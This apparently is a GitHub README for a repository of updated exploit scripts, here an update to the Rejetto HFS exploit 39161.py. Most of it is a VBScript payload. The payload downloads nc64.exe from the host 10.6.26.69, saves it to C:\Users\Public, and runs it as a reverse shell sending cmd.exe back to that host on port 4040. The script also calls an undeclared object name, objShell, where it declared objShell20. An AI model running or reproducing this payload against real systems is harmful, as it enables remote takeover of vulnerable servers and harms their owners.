# CanvasTools

Series of updates for exploits

## Updates
https://github.com/darkniyt/CanvasTools/wiki

### Updates to 39161.py:  https://github.com/darkniyt/CanvasTools/blob/main/39161.py
Rejetto HFS exploit:  https://www.exploit-db.com/exploits/39161
####  Includes below changes to respctive script.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://10.6.26.69/nc64.exe", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc64.exe", 2 '//overwrite
end with
Set objShell20= CreateObject("WScript.Shell")
objShell.Exec("C:\Users\Public\nc64.exe -d 10.6.26.69 4040 -e cmd.exe")
